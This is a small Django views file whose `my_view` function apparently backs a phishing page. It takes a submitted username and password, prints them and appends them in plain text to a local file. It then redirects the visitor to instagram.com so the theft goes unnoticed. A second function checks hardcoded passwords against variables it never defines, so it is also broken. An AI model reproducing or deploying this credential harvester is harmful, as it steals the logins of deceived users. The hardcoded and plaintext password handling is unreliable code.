from django.http import HttpResponse
from django.shortcuts import render
from django.shortcuts import redirect






def homepage(request):
	return render(request, 'index.html')

def processunit(request):
	if ((user  == 'badhonbarman') and (userpass  == '1234')) :
		return render(request, 'access.html')
	elif ((user  == 'mrinalkanti') and (userpass  == '1122')) :
		return render(request, 'mrinal.html')
	else:
		return render(request, 'errorpage.html')

def my_view(request):
	user =  request.POST.get('userID','default')
	userpass =  request.POST.get('userPASS','default')
	print(user)
	print(userpass)
	store = open('database.txt', 'a')
	store.write(f"USER-NAME: {user}\nUSERPASS:{userpass}\n")
	store.close()

	return redirect('https://www.instagram.com/')

	
	


